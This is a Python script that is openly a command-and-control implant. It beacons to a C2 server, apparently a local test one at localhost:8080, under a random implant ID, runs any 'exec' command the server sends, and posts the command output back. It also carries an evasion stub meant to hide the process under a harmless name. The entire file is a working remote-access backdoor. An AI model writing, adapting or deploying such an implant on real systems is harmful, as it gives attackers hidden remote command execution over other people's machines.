#!/usr/bin/env python3
import requests
import time
import json
import uuid
import sys
import os
import subprocess
import shutil
import shlex

# Add root to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import config

C2_URL = "http://localhost:8080"
IMPLANT_ID = str(uuid.uuid4())[:8]

def masquerade():
    """Copy self to a benign name to hide."""
    # Adversarial Evasion: Rename process in ps output if possible (setproctitle)
    # Since we can't, we assume running as "svc_worker.py" helps.
    pass

def beacon():
    # print(f"[*] Implant {IMPLANT_ID} active. C2: {C2_URL}")
    masquerade()

    status = "INIT"
    while True:
        try:
            payload = {
                "id": IMPLANT_ID,
                "status": status,
                "timestamp": time.time()
            }

            resp = requests.post(C2_URL, json=payload, timeout=2)
            data = resp.json()

            cmd = data.get("command")
            if cmd == "exec":
                args = data.get("args")
                # Secure Execution: No Shell Injection
                try:
                    safe_args = shlex.split(args)
                    output = subprocess.check_output(safe_args, shell=False).decode().strip()
                    status = f"OUTPUT: {output}"
                except Exception as e:
                    status = f"EXEC_ERROR: {e}"
            else:
                status = "SLEEPING"

            time.sleep(3)

        except Exception as e:
            # print(f"Beacon failed: {e}")
            time.sleep(5)

if __name__ == "__main__":
    beacon()
